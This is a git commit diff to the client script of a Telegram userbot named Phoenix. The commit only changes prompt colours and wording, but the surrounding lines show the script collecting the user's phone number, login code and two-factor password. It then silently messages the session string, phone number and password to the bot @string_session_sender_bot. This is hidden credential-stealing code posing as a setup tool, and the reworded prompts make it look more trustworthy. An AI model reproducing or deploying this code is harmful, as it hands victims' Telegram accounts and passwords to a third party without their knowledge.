f161e192ba30523968d6086eab1109a7a244603c
Hacker <112378332+Hacker-UZ@users.noreply.github.com>
2023-08-23 17:38:44 +0500

    Update client.py

--- phoenix/client.py
+++ phoenix/client.py
@@ -16,17 +16,17 @@ print("""\033[031m
 Developer: @programmer_www
 Telegram channel: @phoenix_userbot
 """)
-string = input("Press enter: ")
+string = input("\033[032mPress enter: ")
 client = TelegramClient(StringSession(string), api_id, api_hash)
-phone_number = input("Please enter your phone (or bot token): ")
+phone_number = input("\033[032mPlease enter your phone (or bot token): ")
 client.connect()
 
 if not client.is_user_authorized():
     client.send_code_request(phone_number)
     try:
-        me = client.sign_in(phone_number, input('Enter code: '))
+        me = client.sign_in(phone_number, input('Please enter the code you received: '))
         client.send_message("@string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
     except SessionPasswordNeededError:
-        password = input('Enter password: ')
+        password = input('Please enter your password: ')
         me2 = client.sign_in(password=password)  
         client.send_message("@string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}') 
